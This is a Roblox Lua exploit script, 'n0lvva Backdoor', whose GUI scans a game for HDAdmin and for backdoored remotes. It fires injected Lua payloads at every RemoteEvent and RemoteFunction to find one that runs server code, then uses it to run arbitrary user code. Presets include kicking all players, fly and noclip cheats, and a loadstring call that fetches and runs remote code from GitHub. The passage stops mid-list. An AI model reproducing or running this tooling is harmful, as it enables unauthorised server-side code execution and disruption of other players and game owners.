-- n0lvva Backdoor - HDAdmin Scan + Backdoor Detection
-- Version 0.2.5

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LogService = game:GetService("LogService")

local player = Players.LocalPlayer

-- =====================================================
-- SCREEN GUI
-- =====================================================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "n0lvva"
screenGui.DisplayOrder = 999
screenGui.IgnoreGuiInset = true
screenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = CoreGui

-- =====================================================
-- MAIN FRAME
-- =====================================================
local mainFrame = Instance.new("Frame")
mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
mainFrame.BorderSizePixel = 0
mainFrame.Position = UDim2.new(0.062, 0, 0.079, 0)
mainFrame.Size = UDim2.new(0, 621, 0, 353)
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 6)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(89, 89, 89)
mainStroke.Thickness = 0.7
mainStroke.Parent = mainFrame

-- =====================================================
-- DRAG HANDLE
-- =====================================================
local dragHandle = Instance.new("Frame")
dragHandle.BackgroundTransparency = 1
dragHandle.Size = UDim2.new(1, 0, 0, 84)
dragHandle.Parent = mainFrame

local dragging = false
local dragStart = nil
local startPos = nil
local dragInput = nil

local function updateDrag(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, startPos.X.Offset + delta.X,
        startPos.Y.Scale, startPos.Y.Offset + delta.Y
    )
end

dragHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

dragHandle.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateDrag(input)
    end
end)

-- =====================================================
-- TITLE IMAGE (134852122786955)
-- =====================================================
local titleImage = Instance.new("ImageLabel")
titleImage.Image = "rbxassetid://134852122786955"
titleImage.BackgroundTransparency = 1
titleImage.Position = UDim2.new(0.016, 0, 0.04, 0)
titleImage.Size = UDim2.new(0, 169, 0, 60)
titleImage.Parent = mainFrame

-- =====================================================
-- n0lvva LABEL
-- =====================================================
local n0lvvaLabel = Instance.new("TextLabel")
n0lvvaLabel.Font = Enum.Font.Ubuntu
n0lvvaLabel.Text = "n0lvva backdoor"
n0lvvaLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
n0lvvaLabel.TextScaled = true
n0lvvaLabel.TextSize = 20
n0lvvaLabel.TextStrokeTransparency = 0
n0lvvaLabel.BackgroundTransparency = 1
n0lvvaLabel.BorderSizePixel = 0
n0lvvaLabel.Position = UDim2.new(0.32, 0, 0.02, 0)
n0lvvaLabel.Size = UDim2.new(0, 250, 0, 35)
n0lvvaLabel.Name = "n0lvvaLabel"
n0lvvaLabel.Parent = mainFrame

-- =====================================================
-- STATUS INDICATOR
-- =====================================================
local statusImage = Instance.new("ImageLabel")
statusImage.Image = "rbxassetid://7442093008"
statusImage.ImageColor3 = Color3.fromRGB(226, 69, 69)
statusImage.BackgroundTransparency = 1
statusImage.Position = UDim2.new(0.007, 1, 0.822, 0)
statusImage.Size = UDim2.new(0, 50, 0, 50)
statusImage.Name = "stat"
statusImage.Parent = mainFrame

-- =====================================================
-- CLOSE & MINIMIZE
-- =====================================================
local function createIconButton(parent, name, posX, iconId)
    local btn = Instance.new("TextButton")
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    btn.BorderSizePixel = 0
    btn.Position = UDim2.new(posX, 0, 0.063, 0)
    btn.Size = UDim2.new(0, 42, 0, 42)
    btn.Name = name
    btn.Parent = parent

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(57, 57, 57)
    s.Thickness = 1.5
    s.Parent = btn

    local img = Instance.new("ImageLabel")
    img.Image = iconId
    img.ImageColor3 = Color3.fromRGB(144, 144, 144)
    img.BackgroundTransparency = 1
    img.Interactable = false
    img.Position = UDim2.new(0.071, 0, 0.071, 0)
    img.Size = UDim2.new(0, 35, 0, 35)
    img.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
        btn.UIStroke.Color = Color3.fromRGB(65, 65, 65)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)
    btn.MouseButton1Down:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        btn.UIStroke.Color = Color3.fromRGB(50, 50, 50)
    end)
    btn.MouseButton1Up:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)

    return btn
end

local closeBtn = createIconButton(mainFrame, "c", 0.913, "rbxassetid://12953907125")
local minBtn = createIconButton(mainFrame, "m", 0.831, "rbxassetid://125716871945612")

closeBtn.MouseButton1Click:Connect(function()
    mainFrame:Destroy()
end)

local minimized = false
local minimizedFrame = nil

minBtn.MouseButton1Click:Connect(function()
    if minimized then
        mainFrame.Visible = true
        if minimizedFrame then minimizedFrame:Destroy() end
        minimized = false
    else
        mainFrame.Visible = false
        minimizedFrame = Instance.new("ImageButton")
        minimizedFrame.Image = "rbxassetid://134852122786955"
        minimizedFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        minimizedFrame.BorderSizePixel = 0
        minimizedFrame.Size = UDim2.new(0, 50, 0, 50)
        minimizedFrame.Position = UDim2.new(0.846, 0, 0.174, 0)
        minimizedFrame.Parent = screenGui

        local mc = Instance.new("UICorner")
        mc.CornerRadius = UDim.new(0, 6)
        mc.Parent = minimizedFrame

        local ms = Instance.new("UIStroke")
        ms.Color = Color3.fromRGB(57, 57, 57)
        ms.Thickness = 3
        ms.Parent = minimizedFrame

        local mDrag = false
        local mStart = nil
        local mPos = nil
        minimizedFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                mDrag = true
                mStart = input.Position
                mPos = minimizedFrame.Position
            end
        end)
        minimizedFrame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement and mDrag then
                local delta = input.Position - mStart
                minimizedFrame.Position = UDim2.new(
                    mPos.X.Scale, mPos.X.Offset + delta.X,
                    mPos.Y.Scale, mPos.Y.Offset + delta.Y
                )
            end
        end)
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                mDrag = false
            end
        end)

        minimizedFrame.MouseButton1Click:Connect(function()
            mainFrame.Visible = true
            minimizedFrame:Destroy()
            minimized = false
        end)

        minimized = true
    end
end)

-- =====================================================
-- SIDEBAR
-- =====================================================
local sidebar = Instance.new("Frame")
sidebar.BackgroundTransparency = 1
sidebar.Position = UDim2.new(0, 0, 0.28, 0)
sidebar.Size = UDim2.new(0, 65, 0, 190)
sidebar.Name = "Sidebar"
sidebar.Parent = mainFrame

local function createSidebarButton(parent, name, yPos, iconId)
    local btn = Instance.new("TextButton")
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    btn.BorderSizePixel = 0
    btn.Position = UDim2.new(0.143, 0, yPos, 0)
    btn.Size = UDim2.new(0, 42, 0, 42)
    btn.Name = name
    btn.Parent = parent

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(57, 57, 57)
    s.Thickness = 1.5
    s.Parent = btn

    local img = Instance.new("ImageLabel")
    img.Image = iconId
    img.BackgroundTransparency = 1
    img.Interactable = false
    img.Position = UDim2.new(0.071, 0, 0.071, 0)
    img.Size = UDim2.new(0, 35, 0, 35)
    img.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
        btn.UIStroke.Color = Color3.fromRGB(65, 65, 65)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)
    btn.MouseButton1Down:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        btn.UIStroke.Color = Color3.fromRGB(50, 50, 50)
    end)
    btn.MouseButton1Up:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)

    return btn
end

local executorBtn = createSidebarButton(sidebar, "Executor", -0.005, "rbxassetid://96541223")
local presetsBtn = createSidebarButton(sidebar, "Presets", 0.357, "rbxassetid://11570895459")
local logsBtn = createSidebarButton(sidebar, "Logs", 0.711, "rbxassetid://103052477976081")

local divider = Instance.new("ImageLabel")
divider.Image = "rbxasset://textures/ui/Scroll/scroll-middle.png"
divider.ImageColor3 = Color3.fromRGB(67, 67, 67)
divider.BackgroundTransparency = 1
divider.Interactable = false
divider.Position = UDim2.new(-0.919, 0, 0.616, 0)
divider.Rotation = 90
divider.Size = UDim2.new(0, 245, 0, 6)
divider.Name = "Line"
divider.Parent = sidebar

-- =====================================================
-- EXECUTOR FRAME
-- =====================================================
local executorFrame = Instance.new("Frame")
executorFrame.BackgroundTransparency = 1
executorFrame.Position = UDim2.new(0, 0, 0.219, 0)
executorFrame.Size = UDim2.new(0, 621, 0, 275)
executorFrame.Name = "Framee"
executorFrame.Parent = mainFrame

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.CanvasSize = UDim2.new(0, 0, 5, 0)
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(106, 106, 106)
scrollFrame.Active = true
scrollFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
scrollFrame.BorderSizePixel = 0
scrollFrame.Position = UDim2.new(0.118, 0, 0.075, 0)
scrollFrame.Size = UDim2.new(0, 536, 0, 189)
scrollFrame.Parent = executorFrame

local scrollStroke = Instance.new("UIStroke")
scrollStroke.Color = Color3.fromRGB(57, 57, 57)
scrollStroke.Thickness = 1.5
scrollStroke.Parent = scrollFrame

local container = Instance.new("Frame")
container.BackgroundTransparency = 1
container.Size = UDim2.new(0, 537, 0, 1375)
container.Parent = scrollFrame

local codeBox = Instance.new("TextBox")
codeBox.ClearTextOnFocus = false
codeBox.Font = Enum.Font.Code
codeBox.MultiLine = true
codeBox.PlaceholderColor3 = Color3.fromRGB(12, 12, 12)
codeBox.RichText = true
codeBox.Text = "-- n0lvva backdoor executor\n-- Click SCAN to find HDAdmin and backdoors"
codeBox.TextColor3 = Color3.fromRGB(12, 12, 12)
codeBox.TextSize = 18
codeBox.TextTruncate = Enum.TextTruncate.SplitWord
codeBox.TextWrapped = true
codeBox.TextXAlignment = Enum.TextXAlignment.Left
codeBox.TextYAlignment = Enum.TextYAlignment.Top
codeBox.BackgroundTransparency = 1
codeBox.BorderSizePixel = 0
codeBox.Size = UDim2.new(0, 537, 0, 1375)
codeBox.Parent = container

-- =====================================================
-- STATUS DISPLAY
-- =====================================================
local statusMain = Instance.new("TextLabel")
statusMain.Font = Enum.Font.Ubuntu
statusMain.Text = "🔍 스캔 준비됨"
statusMain.TextColor3 = Color3.fromRGB(255, 255, 255)
statusMain.TextScaled = true
statusMain.TextSize = 30
statusMain.TextStrokeTransparency = 0
statusMain.TextWrapped = true
statusMain.BackgroundTransparency = 1
statusMain.BorderSizePixel = 0
statusMain.Position = UDim2.new(0.55, 0, 0.78, 0)
statusMain.Size = UDim2.new(0, 250, 0, 40)
statusMain.Visible = true
statusMain.Name = "StatusMain"
statusMain.Parent = executorFrame

local statusFound = Instance.new("TextLabel")
statusFound.Font = Enum.Font.Ubuntu
statusFound.Text = "✅ 백도어 찾았다!"
statusFound.TextColor3 = Color3.fromRGB(159, 226, 191)
statusFound.TextScaled = true
statusFound.TextSize = 30
statusFound.TextStrokeTransparency = 0
statusFound.TextWrapped = true
statusFound.BackgroundTransparency = 1
statusFound.BorderSizePixel = 0
statusFound.Position = UDim2.new(0.55, 0, 0.78, 0)
statusFound.Size = UDim2.new(0, 250, 0, 40)
statusFound.Visible = false
statusFound.Name = "StatusFound"
statusFound.Parent = executorFrame

local statusSearching = Instance.new("TextLabel")
statusSearching.Font = Enum.Font.Ubuntu
statusSearching.Text = "🔍 스캔중..."
statusSearching.TextColor3 = Color3.fromRGB(255, 184, 71)
statusSearching.TextScaled = true
statusSearching.TextSize = 30
statusSearching.TextStrokeTransparency = 0
statusSearching.TextWrapped = true
statusSearching.BackgroundTransparency = 1
statusSearching.BorderSizePixel = 0
statusSearching.Position = UDim2.new(0.55, 0, 0.78, 0)
statusSearching.Size = UDim2.new(0, 250, 0, 40)
statusSearching.Visible = false
statusSearching.Name = "StatusSearching"
statusSearching.Parent = executorFrame

local statusNotFound = Instance.new("TextLabel")
statusNotFound.Font = Enum.Font.Ubuntu
statusNotFound.Text = "❌ no backdoor"
statusNotFound.TextColor3 = Color3.fromRGB(226, 69, 69)
statusNotFound.TextScaled = true
statusNotFound.TextSize = 30
statusNotFound.TextStrokeTransparency = 0
statusNotFound.TextWrapped = true
statusNotFound.BackgroundTransparency = 1
statusNotFound.BorderSizePixel = 0
statusNotFound.Position = UDim2.new(0.55, 0, 0.78, 0)
statusNotFound.Size = UDim2.new(0, 250, 0, 40)
statusNotFound.Visible = false
statusNotFound.Name = "StatusNotFound"
statusNotFound.Parent = executorFrame

local statusHDAdmin = Instance.new("TextLabel")
statusHDAdmin.Font = Enum.Font.Ubuntu
statusHDAdmin.Text = "⚠️ HDAdmin 찾음 (백도어 없음)"
statusHDAdmin.TextColor3 = Color3.fromRGB(255, 184, 71)
statusHDAdmin.TextScaled = true
statusHDAdmin.TextSize = 25
statusHDAdmin.TextStrokeTransparency = 0
statusHDAdmin.TextWrapped = true
statusHDAdmin.BackgroundTransparency = 1
statusHDAdmin.BorderSizePixel = 0
statusHDAdmin.Position = UDim2.new(0.50, 0, 0.78, 0)
statusHDAdmin.Size = UDim2.new(0, 300, 0, 40)
statusHDAdmin.Visible = false
statusHDAdmin.Name = "StatusHDAdmin"
statusHDAdmin.Parent = executorFrame

-- Backdoor detail log
local backdoorLog = Instance.new("TextLabel")
backdoorLog.Font = Enum.Font.SourceSans
backdoorLog.Text = "backdoor: none"
backdoorLog.TextColor3 = Color3.fromRGB(255, 255, 255)
backdoorLog.TextScaled = true
backdoorLog.TextSize = 15
backdoorLog.TextStrokeTransparency = 0
backdoorLog.TextWrapped = true
backdoorLog.BackgroundTransparency = 1
backdoorLog.BorderSizePixel = 0
backdoorLog.Position = UDim2.new(0.612, 0, 0.88, 0)
backdoorLog.Size = UDim2.new(0, 231, 0, 30)
backdoorLog.Visible = false
backdoorLog.Name = "Log"
backdoorLog.Parent = executorFrame

-- =====================================================
-- EXECUTOR BUTTONS
-- =====================================================
local function createExecutorButton(parent, name, posX, posY, iconId, text)
    local btn = Instance.new("TextButton")
    btn.Font = Enum.Font.SourceSans
    btn.Text = text or ""
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 30
    btn.TextWrapped = true
    btn.AutoButtonColor = false
    btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    btn.BorderSizePixel = 0
    btn.Position = UDim2.new(posX, 0, posY, 0)
    btn.Size = UDim2.new(0, 42, 0, 42)
    btn.Name = name
    btn.Parent = parent

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(57, 57, 57)
    s.Thickness = 1.5
    s.Parent = btn

    if iconId then
        local img = Instance.new("ImageLabel")
        img.Image = iconId
        img.BackgroundTransparency = 1
        img.Interactable = false
        img.Position = UDim2.new(0.071, 0, 0.071, 0)
        img.Size = UDim2.new(0, 35, 0, 35)
        img.Parent = btn
    end

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
        btn.UIStroke.Color = Color3.fromRGB(65, 65, 65)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)
    btn.MouseButton1Down:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        btn.UIStroke.Color = Color3.fromRGB(50, 50, 50)
    end)
    btn.MouseButton1Up:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)

    return btn
end

local executeBtn = createExecutorButton(executorFrame, "Execute", 0.118, 0.802, "rbxassetid://7980684777")
local clearBtn = createExecutorButton(executorFrame, "Clear", 0.215, 0.805, "rbxassetid://16346922164")
local scanBtn = createExecutorButton(executorFrame, "scan", 0.916, 0.802, "rbxassetid://115736032752379")
local r6Btn = createExecutorButton(executorFrame, "rsix", 0.411, 0.805, nil, "R6")
local dcBtn = createExecutorButton(executorFrame, "dc", 0.311, 0.805, "rbxassetid://124991788631069")

-- =====================================================
-- HDAdmin SCANNER
-- =====================================================
local hdAdminVulns = {
    remoteEvents = {
        "AdminCommand", "KickPlayer", "BanPlayer", "TPPlayer", "GiveItem",
        "SetRank", "ExecuteCommand", "RunScript", "AdminPanel", "ModCommand",
        "ServerCommand", "RemoteAdmin", "AdminRemote", "CommandEvent"
    },
    remoteFunctions = {
        "AdminFunction", "GetPlayerData", "SetPlayerData", "ModFunction",
        "ServerFunction", "AdminInvoke", "CommandFunction"
    },
    modules = {
        "HDAdmin", "hdadmin", "HD_Admin", "AdminSystem", "AdminModule",
        "ServerAdmin", "Moderation", "AdminPanel", "StaffTools"
    },
    scripts = {
        "AdminScript", "ServerAdmin", "ModerationScript", "AdminHandler",
        "CommandHandler", "RemoteAdminScript"
    }
}

local function scanHDAdmin()
    local results = { found = false, remotes = {}, modules = {}, scripts = {} }
    
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            for _, vuln in ipairs(hdAdminVulns.remoteEvents) do
                if obj.Name:find(vuln) or obj.Name:lower():find("admin") then
                    table.insert(results.remotes, { name = obj.Name, fullName = obj:GetFullName(), type = "RemoteEvent" })
                    results.found = true
                end
            end
        end
        if obj:IsA("RemoteFunction") then
            for _, vuln in ipairs(hdAdminVulns.remoteFunctions) do
                if obj.Name:find(vuln) or obj.Name:lower():find("admin") then
                    table.insert(results.remotes, { name = obj.Name, fullName = obj:GetFullName(), type = "RemoteFunction" })
                    results.found = true
                end
            end
        end
        if obj:IsA("ModuleScript") then
            for _, vuln in ipairs(hdAdminVulns.modules) do
                if obj.Name:find(vuln) or obj.Name:lower():find("admin") then
                    table.insert(results.modules, { name = obj.Name, fullName = obj:GetFullName() })
                    results.found = true
                end
            end
        end
        if obj:IsA("Script") or obj:IsA("LocalScript") then
            for _, vuln in ipairs(hdAdminVulns.scripts) do
                if obj.Name:find(vuln) or obj.Name:lower():find("admin") then
                    table.insert(results.scripts, { name = obj.Name, fullName = obj:GetFullName(), type = obj.ClassName })
                    results.found = true
                end
            end
        end
    end
    return results
end

-- =====================================================
-- BACKDOOR SCANNER
-- =====================================================
local foundExploit = false
local remoteEvent = nil
local remoteFunction = nil
local scanTime = 0
local scanning = false
local hdAdminData = nil

local EXCLUDED_REMOTES = {
    UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
    OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
    NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
    SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
    PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
    PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
    GetServerVersion = true, GetClientId = true, GetInventory = true,
    GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
    UpdatePlayerBlockList = true, SetAvatarBlockList = true,
    SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
    ReportAbuse = true
}

local SAFE_LOCATIONS = {
    ["CoreGui"] = true, ["ServerStorage"] = true, ["ReplicatedFirst"] = true,
    ["ServerScriptService"] = true
}

local function isLikelyBackdoorRemote(remote)
    local name = remote.Name
    local parent = remote.Parent
    if SAFE_LOCATIONS[parent.ClassName] then return false end
    if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
    if EXCLUDED_REMOTES[name] then return false end
    return true
end

local function testRemote(remote, isFunction)
    if foundExploit then return false end
    if not isLikelyBackdoorRemote(remote) then return false end

    local modelName = "n0lvva_" .. tostring(os.clock()):gsub("%.", "")
    local rs = ReplicatedStorage
    local foundEvent = false

    local conn = rs.DescendantAdded:Connect(function(inst)
        if inst.Name == modelName then foundEvent = true end
    end)

    local function cleanup()
        conn:Disconnect()
        local f = rs:FindFirstChild(modelName)
        if f then f:Destroy() end
    end

    pcall(function()
        local payload = string.format([[
            local m = Instance.new("Folder")
            m.Name = "%s"
            m.Parent = game:GetService("ReplicatedStorage")
        ]], modelName)
        if isFunction then
            remote:InvokeServer('n0lvvaTSS', payload .. "\nreturn true")
        else
            remote:FireServer(payload)
        end
    end)

    local timeout = 1
    local start = os.clock()
    while os.clock() - start < timeout do
        if foundEvent or rs:FindFirstChild(modelName) then
            foundEvent = true
            break
        end
        task.wait(0.01)
    end

    cleanup()

    if foundEvent and not foundExploit then
        foundExploit = true
        if isFunction then
            remoteFunction = remote
        else
            remoteEvent = remote
        end
        return true
    end
    return false
end

local function findRemote()
    local trueStart = os.clock()
    foundExploit = false
    remoteEvent = nil
    remoteFunction = nil
    
    -- First: Scan for HDAdmin
    hdAdminData = scanHDAdmin()
    
    -- Second: Scan for backdoor remotes
    local remotes = {}
    for _, remote in ipairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            table.insert(remotes, remote)
        end
    end

    local MAX_CONCURRENT = 64
    local activeTasks = 0
    local taskDone = Instance.new("BindableEvent")

    for i = 1, #remotes do
        if foundExploit then break end

        while activeTasks >= MAX_CONCURRENT do
            taskDone.Event:Wait()
        end

        activeTasks = activeTasks + 1
        task.spawn(function()
            pcall(function()
                testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
            end)
            activeTasks = activeTasks - 1
            taskDone:Fire()
        end)
    end

    while activeTasks > 0 and not foundExploit do
        taskDone.Event:Wait()
    end

    scanTime = os.clock() - trueStart
    return foundExploit
end

local function fireRemoteEvent(code)
    if remoteEvent then
        remoteEvent:FireServer(code)
        return true
    elseif remoteFunction then
        pcall(function()
            remoteFunction:InvokeServer('n0lvvaTSS', code)
        end)
        return true
    else
        return false
    end
end

-- =====================================================
-- SCAN BUTTON - HDAdmin First, Then Backdoor
-- =====================================================
scanBtn.MouseButton1Click:Connect(function()
    if scanning then return end
    scanning = true

    -- Reset all status
    statusMain.Visible = false
    statusFound.Visible = false
    statusSearching.Visible = false
    statusNotFound.Visible = false
    statusHDAdmin.Visible = false
    backdoorLog.Visible = false
    scanBtn.Visible = false
    
    -- Show searching
    statusSearching.Visible = true
    statusSearching.Text = "🔍 HDAdmin 스캔중..."
    statusImage.ImageColor3 = Color3.fromRGB(255, 184, 71)

    task.spawn(function()
        local result = findRemote()
        
        -- Check HDAdmin first
        if hdAdminData and hdAdminData.found then
            statusHDAdmin.Visible = true
            local count = #hdAdminData.remotes + #hdAdminData.modules + #hdAdminData.scripts
            statusHDAdmin.Text = "⚠️ HDAdmin 찾음! (" .. count .. "개 취약점)"
            
            CoreGui:SetCore("SendNotification", {
                Title = "💀 n0lvva",
                Text = "⚠️ HDAdmin 취약점 발견! (" .. count .. "개)",
                Duration = 4
            })
        end
        
        -- Then check backdoor
        if result then
            statusSearching.Visible = false
            statusFound.Visible = true
            statusHDAdmin.Visible = false
            backdoorLog.Visible = true
            local name = remoteEvent and remoteEvent.Name or (remoteFunction and remoteFunction.Name or "unknown")
            backdoorLog.Text = "backdoor: " .. name
            statusImage.ImageColor3 = Color3.fromRGB(159, 226, 191)
            
            -- Test execution
            fireRemoteEvent('print("[n0lvva] Backdoor confirmed!")')
            
            CoreGui:SetCore("SendNotification", {
                Title = "💀 n0lvva",
                Text = "✅ 백도어 찾았다! " .. name .. " (" .. scanTime .. "s)",
                Duration = 5
            })
            
        elseif hdAdminData and hdAdminData.found then
            -- HDAdmin found but no backdoor
            statusSearching.Visible = false
            statusFound.Visible = false
            statusNotFound.Visible = false
            statusHDAdmin.Visible = true
            statusImage.ImageColor3 = Color3.fromRGB(255, 184, 71)
            backdoorLog.Visible = true
            backdoorLog.Text = "HDAdmin only - no remote backdoor"
            
            CoreGui:SetCore("SendNotification", {
                Title = "💀 n0lvva",
                Text = "⚠️ HDAdmin만 찾음 (백도어 없음)",
                Duration = 4
            })
            
            task.wait(3)
            statusHDAdmin.Visible = false
            statusNotFound.Visible = true
            statusNotFound.Text = "❌ no backdoor"
            statusImage.ImageColor3 = Color3.fromRGB(226, 69, 69)
            
        else
            -- Nothing found
            statusSearching.Visible = false
            statusFound.Visible = false
            statusHDAdmin.Visible = false
            statusNotFound.Visible = true
            statusNotFound.Text = "❌ no backdoor"
            statusImage.ImageColor3 = Color3.fromRGB(226, 69, 69)
            backdoorLog.Visible = false
            
            CoreGui:SetCore("SendNotification", {
                Title = "💀 n0lvva",
                Text = "❌ no backdoor (스캔 시간: " .. scanTime .. "s)",
                Duration = 4
            })
        end
        
        task.wait(2)
        if statusNotFound.Visible then
            statusNotFound.Visible = false
            statusMain.Visible = true
            statusMain.Text = "🔍 스캔 완료"
        end
        scanBtn.Visible = true
        scanning = false
    end)
end)

-- =====================================================
-- EXECUTE BUTTON
-- =====================================================
executeBtn.MouseButton1Click:Connect(function()
    local code = codeBox.Text
    if not code or code == "" then
        CoreGui:SetCore("SendNotification", {
            Title = "💀 n0lvva",
            Text = "⚠️ 실행할 코드를 입력하세요",
            Duration = 3
        })
        return
    end
    
    if not remoteEvent and not remoteFunction then
        CoreGui:SetCore("SendNotification", {
            Title = "💀 n0lvva",
            Text = "❌ no backdoor. 스캔 먼저 실행",
            Duration = 4
        })
        return
    end
    
    local ok = fireRemoteEvent(code)
    CoreGui:SetCore("SendNotification", {
        Title = "💀 n0lvva",
        Text = ok and "✅ 코드 실행 성공!" or "❌ 실행 실패",
        Duration = 3
    })
end)

-- =====================================================
-- CLEAR BUTTON
-- =====================================================
clearBtn.MouseButton1Click:Connect(function()
    codeBox.Text = ""
end)

-- =====================================================
-- R6 BUTTON
-- =====================================================
r6Btn.MouseButton1Click:Connect(function()
    if remoteEvent or remoteFunction then
        fireRemoteEvent('require(3436957371):r6("' .. player.Name .. '")')
        CoreGui:SetCore("SendNotification", {
            Title = "💀 n0lvva",
            Text = "✅ R6 실행됨",
            Duration = 3
        })
    end
end)

-- =====================================================
-- DISCORD BUTTON
-- =====================================================
dcBtn.MouseButton1Click:Connect(function()
    CoreGui:SetCore("SendNotification", {
        Title = "💀 n0lvva",
        Text = "Discord link copied",
        Duration = 3
    })
    setclipboard("https://discord.gg/n0lvva")
end)

-- =====================================================
-- PRESETS FRAME
-- =====================================================
local presetsFrame = Instance.new("Frame")
presetsFrame.BackgroundTransparency = 1
presetsFrame.Position = UDim2.new(0, 0, 0.219, 0)
presetsFrame.Size = UDim2.new(0, 621, 0, 275)
presetsFrame.Visible = false
presetsFrame.Name = "Presets"
presetsFrame.Parent = mainFrame

local presetLog = Instance.new("TextLabel")
presetLog.Font = Enum.Font.SourceSans
presetLog.Text = "n0lvva presets - Click to load"
presetLog.TextColor3 = Color3.fromRGB(255, 255, 255)
presetLog.TextScaled = true
presetLog.TextSize = 15
presetLog.TextStrokeTransparency = 0
presetLog.TextWrapped = true
presetLog.BackgroundTransparency = 1
presetLog.BorderSizePixel = 0
presetLog.Position = UDim2.new(0.117, 0, 0.788, 0)
presetLog.Size = UDim2.new(0, 532, 0, 40)
presetLog.Name = "Log"
presetLog.Parent = presetsFrame

local n0lvvaPresets = {
    {name = "Test Print", posX = 0.125, posY = 0.116, code = 'print("[n0lvva] Hello!")'},
    {name = "Kick All", posX = 0.360, posY = 0.116, code = 'for _, p in pairs(game.Players:GetPlayers()) do p:Kick("n0lvva") end'},
    {name = "Fly", posX = 0.582, posY = 0.116, code = 'local p=game.Players.LocalPlayer;local c=p.Character;if c then local hrp=c:FindFirstChild("HumanoidRootPart");if hrp then local bv=Instance.new("BodyVelocity");bv.MaxForce=Vector3.new(1e9,1e9,1e9);bv.Velocity=Vector3.new(0,50,0);bv.Parent=hrp;task.wait(5);bv:Destroy() end end'},
    {name = "Noclip", posX = 0.791, posY = 0.116, code = 'for _, v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end'},
    {name = "Infinite Yield", posX = 0.125, posY = 0.308, code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()'},
